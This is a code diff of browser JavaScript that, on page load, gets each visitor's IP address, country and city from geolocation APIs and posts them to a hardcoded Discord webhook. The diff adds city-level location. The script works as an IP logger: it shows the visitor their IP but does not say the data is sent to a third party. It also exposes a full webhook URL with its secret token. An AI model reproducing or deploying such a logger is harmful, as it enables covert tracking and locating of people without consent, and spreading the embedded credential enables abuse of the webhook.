@@ -1,46 +1,37 @@
 // Discord webhook URL
 const webhookURL = "https://discord.com/api/webhooks/1348973855217156116/Y_wUbOXZn0U769LrIiPAFSE7VszYA1Kjc3y_35KnOXXKxn6EsA-ggbDVlunb8GLhh6kd";
 
-// Function to fetch the user's IP address
-async function fetchIP() {
+// Function to fetch the user's IP address and location data
+async function fetchIPData() {
   try {
-    const response = await fetch("https://api.ipify.org?format=json");
-    const data = await response.json();
-    return data.ip;
-  } catch (error) {
-    console.error("Error fetching IP:", error);
-    return null;
-  }
-}
-
-// Function to fetch the country and country code based on the IP address
-async function fetchCountry(ip) {
-  try {
-    const response = await fetch(`https://ipapi.co/${ip}/json/`);
+    const response = await fetch("https://ipwhois.app/json/");
     const data = await response.json();
     return {
-      country: data.country_name,
+      ip: data.ip,
+      country: data.country,
       countryCode: data.country_code,
+      city: data.city // Fetching city from the response
     };
   } catch (error) {
-    console.error("Error fetching country:", error);
+    console.error("Error fetching IP data:", error);
     return {
+      ip: "Unknown",
       country: "Unknown",
-      countryCode: "XX", // Default country code for unknown
+      countryCode: "XX", // Default for unknown
+      city: "Unknown"
     };
   }
 }
 
 // Function to get the country flag emoji
 function getCountryFlagEmoji(countryCode) {
-  // Convert country code to flag emoji
   return String.fromCodePoint(...[...countryCode.toUpperCase()].map((char) => 0x1f1a5 + char.charCodeAt(0)));
 }
 
 // Function to send data to Discord webhook
-async function sendToDiscord(ip, country, flag) {
+async function sendToDiscord(ip, country, city, flag) {
   const data = {
-    content: `**IP Address:** ${ip}\n**Country:** ${country} ${flag}`,
+    content: `**IP Address:** ${ip}\n**Country:** ${country} ${flag}\n**City:** ${city}`,
   };
 
   try {
@@ -57,22 +48,18 @@ async function sendToDiscord(ip, country, flag) {
   }
 }
 
-// Main function to fetch IP, country, flag, and display/send data
+// Main function to fetch IP, country, city, flag, and display/send data
 async function main() {
-  const ip = await fetchIP();
-  if (ip) {
-    const { country, countryCode } = await fetchCountry(ip);
-    const flag = getCountryFlagEmoji(countryCode);
+  const { ip, country, countryCode, city } = await fetchIPData();
+  const flag = getCountryFlagEmoji(countryCode);
 
-    // Display the IP address and flag on the webpage
-    document.getElementById("ip-address").textContent = ip;
-    document.getElementById("country-flag").textContent = flag;
+  // Display the IP address, city, and flag on the webpage
+  document.getElementById("ip-address").textContent = ip;
+  document.getElementById("country-flag").textContent = flag;
+  document.getElementById("city").textContent = city;
 
-    // Send IP, country, and flag to Discord
-    await sendToDiscord(ip, country, flag);
-  } else {
-    document.getElementById("ip-address").textContent = "Failed to fetch IP.";
-  }
+  // Send IP, country, city, and flag to Discord
+  await sendToDiscord(ip, country, city, flag);
 }
 
 // Run the main function when the page loads
